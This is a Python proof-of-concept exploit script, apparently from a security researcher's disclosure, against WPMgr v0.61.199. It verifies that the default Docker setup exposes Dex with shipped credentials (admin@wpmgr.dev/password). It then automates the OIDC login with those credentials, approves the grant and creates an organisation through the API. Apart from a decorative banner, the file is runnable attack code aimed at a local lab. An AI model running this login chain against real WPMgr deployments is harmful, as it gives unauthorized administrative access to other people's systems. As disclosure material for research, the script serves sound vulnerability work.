#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: wpmgr-dex-default-password (Critical: 9.8)
#  Vendor: WPMgr (mosamlife)
#  Versions: WPMgr v0.61.199 default compose
#  Impact: shipped Dex admin@wpmgr.dev/password on 0.0.0.0; SSO then creates a tenant
#  Requires: Docker, git, python3; loopback compose clones mosamlife/wpmgr at e1b3a163
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "wpmgr-dex-default-password"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _builtins.print(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _builtins.print(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_builtins.print = _cprint

"""WPMgr v0.61.199: default Dex password + OIDC on, then POST /api/v1/orgs."""

import html
import http.client
import json
import os
import re
import urllib.error
import urllib.parse
from dataclasses import dataclass
from pathlib import Path
from typing import Any

LABEL = "WPMGR-H18-DEX-DEFAULT"
WITNESS = "WPMGR-H18-DEX-CREATED-TENANT"
HOST = "127.0.0.1"
WEB_PORT = int(os.environ.get("WPMGR_H18_WEB_PORT", "18210"))
API_PORT = int(os.environ.get("WPMGR_H18_API_PORT", "18211"))
DEX_PORT = int(os.environ.get("WPMGR_H18_DEX_PORT", "18214"))
WEB = f"http://{HOST}:{WEB_PORT}"
DEX_HOST = "dex:5556"
DEX_EMAIL = "admin@wpmgr.dev"
DEX_PASSWORD = "password"
CLAIM_SECRET = "h18-bootstrap-claim-secret-value-ok"
CLAIM_EMAIL = "owner@example.com"
CLAIM_PASSWORD = "lab-owner-pass-1"
ORG_NAME = "H18 Dex Tenant"
HERE = Path(__file__).resolve().parent
PIN = Path(os.environ.get("WPMGR_PIN", str(HERE / "pin")))
PIN_HASH = "$2a$10$Dfir7c2N/g9wBJ8QaLJQceBQoDM0JiBSEvmiQWpztFLtvaBLuePpa"
HIDDEN_INPUT = re.compile(
    r"<input[^>]*type=['\"]hidden['\"][^>]*>",
    re.IGNORECASE,
)
FORM_ACTION = re.compile(
    r"<form[^>]*action=['\"]([^'\"]*)['\"]",
    re.IGNORECASE,
)
INPUT_NAME = re.compile(r"name=['\"]([^'\"]+)['\"]", re.IGNORECASE)
INPUT_VALUE = re.compile(r"value=['\"]([^'\"]*)['\"]", re.IGNORECASE)


class ApiError(Exception):
    def __init__(self, reason: str) -> None:
        super().__init__(reason)
        self.reason = reason


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str
    headers: list[tuple[str, str]]
    url: str

    def header(self, name: str) -> str:
        want = name.lower()
        for key, value in self.headers:
            if key.lower() == want:
                return value
        return ""


def cookie_header(store: dict[str, str]) -> str:
    return "; ".join(f"{name}={value}" for name, value in store.items())


def absorb_cookies(store: dict[str, str], result: HttpResult) -> None:
    for key, value in result.headers:
        if key.lower() != "set-cookie":
            continue
        pair = value.split(";", 1)[0]
        if "=" not in pair:
            continue
        name, crumb = pair.split("=", 1)
        name = name.strip()
        if name:
            store[name] = crumb.strip()


def http_request(
    method: str,
    url: str,
    *,
    headers: dict[str, str] | None = None,
    data: bytes | None = None,
    cookies: dict[str, str] | None = None,
    host_override: str | None = None,
    timeout: int = 30,
) -> HttpResult:
    parsed = urllib.parse.urlparse(url)
    if parsed.hostname is None:
        raise ApiError("bad-url")
    path = parsed.path or "/"
    if parsed.query:
        path = f"{path}?{parsed.query}"
    port = parsed.port or 80
    hdrs = dict(headers or {})
    if cookies:
        hdrs["Cookie"] = cookie_header(cookies)
    if host_override:
        hdrs["Host"] = host_override
    conn = http.client.HTTPConnection(parsed.hostname, port, timeout=timeout)
    try:
        conn.request(method, path, body=data, headers=hdrs)
        resp = conn.getresponse()
        raw = resp.read()
        return HttpResult(
            resp.status,
            raw.decode("utf-8", errors="replace"),
            resp.getheaders(),
            url,
        )
    except (TimeoutError, ConnectionError, OSError, http.client.HTTPException) as exc:
        raise ApiError("unreachable") from exc
    finally:
        conn.close()


def loads(result: HttpResult, prefix: str) -> Any:
    try:
        return json.loads(result.body or "null")
    except json.JSONDecodeError as exc:
        raise ApiError(f"{prefix}-json-{result.status}") from exc


def form_action(body: str, current: str) -> str:
    match = FORM_ACTION.search(body)
    if match is None:
        return current
    return urllib.parse.urljoin(current, html.unescape(match.group(1)))


def hidden_fields(body: str) -> dict[str, str]:
    fields: dict[str, str] = {}
    for tag in HIDDEN_INPUT.findall(body):
        name_match = INPUT_NAME.search(tag)
        if name_match is None:
            continue
        value_match = INPUT_VALUE.search(tag)
        fields[html.unescape(name_match.group(1))] = html.unescape(
            value_match.group(1) if value_match else ""
        )
    return fields


def rewrite(location: str, current: str, current_is_dex: bool) -> tuple[str, bool]:
    if location.startswith("/") and current_is_dex:
        return f"http://{HOST}:{DEX_PORT}{location}", True
    joined = urllib.parse.urljoin(current, location)
    parsed = urllib.parse.urlparse(joined)
    host = (parsed.hostname or "").lower()
    if host in {"dex", "dex.localhost"}:
        path = parsed.path or "/"
        if parsed.query:
            path = f"{path}?{parsed.query}"
        return f"http://{HOST}:{DEX_PORT}{path}", True
    return joined, False


def is_redirect(status: int) -> bool:
    return status in {301, 302, 303, 307, 308}


def pin_text(rel: str) -> str:
    path = PIN / rel
    if not path.is_file():
        raise ApiError(f"pin-missing-{rel.replace('/', '-')}")
    return path.read_text(encoding="utf-8")


def bind_line(compose: str, needle: str) -> str:
    for raw in compose.splitlines():
        line = raw.strip().strip('"').strip("'")
        if needle in raw:
            return raw.strip()
    return ""


def assert_pin() -> list[str]:
    notes: list[str] = []
    compose = pin_text("infra/docker-compose.yml")
    dex = pin_text("infra/dex/config.yaml")
    init = pin_text("scripts/init-env.sh")
    example = pin_text(".env.example")

    web = bind_line(compose, "${WPMGR_WEB_PORT:-8088}:80")
    dex_bind = bind_line(compose, "${WPMGR_DEX_PORT:-5556}:5556")
    api = bind_line(compose, "${WPMGR_API_PORT:-8081}:8080")
    if "${WPMGR_WEB_PORT:-8088}:80" not in web or "127.0.0.1" in web:
        raise ApiError("pin-web-bind")
    if "${WPMGR_DEX_PORT:-5556}:5556" not in dex_bind or "127.0.0.1" in dex_bind:
        raise ApiError("pin-dex-bind")
    if "127.0.0.1:${WPMGR_API_PORT:-8081}:8080" not in api:
        raise ApiError("pin-api-bind")
    notes.append("IOC pin-bind web=0.0.0.0:8088 dex=0.0.0.0:5556 api=127.0.0.1:8081")

    issuer = "WPMGR_OIDC_ISSUER: ${WPMGR_OIDC_ISSUER:-http://dex.localhost:5556/dex}"
    if issuer not in compose:
        raise ApiError("pin-oidc-issuer-default")
    example_issuer = ""
    for line in example.splitlines():
        if line.startswith("WPMGR_OIDC_ISSUER="):
            example_issuer = line.split("=", 1)[1]
            break
    else:
        raise ApiError("pin-env-issuer-missing")
    if example_issuer != "":
        raise ApiError("pin-env-issuer-set")
    notes.append("IOC pin-oidc empty-env-issuer still-defaults-to-dex")

    if 'email: "admin@wpmgr.dev"' not in dex:
        raise ApiError("pin-dex-email")
    if PIN_HASH not in dex:
        raise ApiError("pin-dex-hash")
    if "secret: wpmgr-oidc-dev-secret" not in dex:
        raise ApiError("pin-dex-client-secret")
    if "# password: password" not in dex:
        raise ApiError("pin-dex-password-comment")
    notes.append("IOC pin-dex admin@wpmgr.dev bcrypt-password client=wpmgr-oidc-dev-secret")

    lowered = init.lower()
    if "wpmgr_oidc" in lowered or "wpmgr-oidc-dev-secret" in init:
        raise ApiError("pin-init-rotates-oidc")
    if "admin@wpmgr.dev" in init or "staticpasswords" in lowered:
        raise ApiError("pin-init-rotates-dex")
    if "dex" in lowered:
        raise ApiError("pin-init-mentions-dex")
    notes.append("IOC pin-init-env never-rotates-dex")
    return notes


def claim_owner() -> None:
    payload = json.dumps(
        {"email": CLAIM_EMAIL, "password": CLAIM_PASSWORD, "name": "lab owner"}
    ).encode("utf-8")
    result = http_request(
        "POST",
        f"{WEB}/auth/register",
        headers={
            "Content-Type": "application/json",
            "X-Wpmgr-Bootstrap-Claim": CLAIM_SECRET,
        },
        data=payload,
    )
    if result.status != 201:
        raise ApiError(f"claim-{result.status}")


def dex_login(web_cookies: dict[str, str]) -> None:
    dex_cookies: dict[str, str] = {}
    start = http_request("GET", f"{WEB}/auth/oidc/login", cookies=web_cookies)
    absorb_cookies(web_cookies, start)
    if not is_redirect(start.status) or not start.header("location"):
        raise ApiError(f"oidc-login-{start.status}")

    url, is_dex = rewrite(start.header("location"), start.url, False)
    if not is_dex:
        raise ApiError("oidc-login-not-dex")
    method = "GET"
    data: bytes | None = None
    posted_login = False
    for _ in range(24):
        host_override = DEX_HOST if is_dex else None
        jar = dex_cookies if is_dex else web_cookies
        headers: dict[str, str] = {}
        if data is not None:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        result = http_request(
            method,
            url,
            headers=headers,
            data=data,
            cookies=jar,
            host_override=host_override,
        )
        absorb_cookies(jar, result)
        data = None
        method = "GET"

        if not is_dex:
            absorb_cookies(web_cookies, result)
            if is_redirect(result.status) and "/auth/oidc/callback" not in urllib.parse.urlparse(
                url
            ).path:
                nxt = result.header("location")
                if nxt:
                    url, is_dex = rewrite(nxt, url, False)
                    continue
            if result.status in {200, 302, 303} and web_cookies.get("wpmgr_session"):
                return
            raise ApiError(f"oidc-callback-{result.status}")

        if is_redirect(result.status):
            loc = result.header("location")
            if not loc:
                raise ApiError("dex-redirect-empty")
            url, is_dex = rewrite(loc, url, True)
            continue

        if result.status != 200:
            raise ApiError(f"dex-status-{result.status}")

        if 'name="login"' in result.body and 'name="password"' in result.body:
            fields = hidden_fields(result.body)
            fields["login"] = DEX_EMAIL
            fields["password"] = DEX_PASSWORD
            method = "POST"
            data = urllib.parse.urlencode(fields).encode("utf-8")
            url, is_dex = rewrite(form_action(result.body, url), url, True)
            posted_login = True
            continue

        if "Grant Access" in result.body or 'name="approval"' in result.body:
            fields = hidden_fields(result.body)
            fields["approval"] = "approve"
            method = "POST"
            data = urllib.parse.urlencode(fields).encode("utf-8")
            url, is_dex = rewrite(form_action(result.body, url), url, True)
            continue

        raise ApiError("dex-stuck" if posted_login else "dex-no-login-form")
    raise ApiError("dex-too-many-hops")


def create_org(web_cookies: dict[str, str]) -> str:
    payload = json.dumps({"name": ORG_NAME}).encode("utf-8")
    result = http_request(
        "POST",
        f"{WEB}/api/v1/orgs",
        headers={"Content-Type": "application/json"},
        data=payload,
        cookies=web_cookies,
    )
    if result.status != 201:
        raise ApiError(f"orgs-create-{result.status}")
    body = loads(result, "orgs-create")
    if not isinstance(body, dict):
        raise ApiError("orgs-create-shape")
    org_id = str(body.get("id") or "")
    if not org_id:
        raise ApiError("orgs-create-id")
    return org_id


def finish(lines: list[str], last: str) -> int:
    print(last, flush=True)
    lines.append(last)
    (HERE / "poc-last-run.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")
    return 0 if last.startswith("SUCCESS ") else 1


def main() -> int:
    lines: list[str] = []

    def note(msg: str) -> None:
        print(msg, flush=True)
        lines.append(msg)

    try:
        for item in assert_pin():
            note(item)
        note(f"IOC lab-ports web={WEB_PORT} api={API_PORT} dex={DEX_PORT}")

        ready = http_request("GET", f"http://{HOST}:{API_PORT}/readyz")
        note(f"IOC readyz={ready.status}")
        if ready.status != 200:
            raise ApiError(f"readyz-{ready.status}")

        claim_owner()
        note("IOC bootstrap-claim=201")

        web_cookies: dict[str, str] = {}
        dex_login(web_cookies)
        if "wpmgr_session" not in web_cookies:
            raise ApiError("dex-no-session")
        note("IOC dex-sso=admin@wpmgr.dev session=1")

        org_id = create_org(web_cookies)
        note(f"IOC org-id={org_id}")
        return finish(lines, f"SUCCESS {LABEL} {WITNESS}")
    except ApiError as exc:
        return finish(lines, f"FAIL {LABEL} {exc.reason} {WITNESS}")
    except OSError:
        return finish(lines, f"FAIL {LABEL} os-error {WITNESS}")
    except urllib.error.URLError:
        return finish(lines, f"FAIL {LABEL} url-error {WITNESS}")


if __name__ == "__main__":
    raise SystemExit(main())

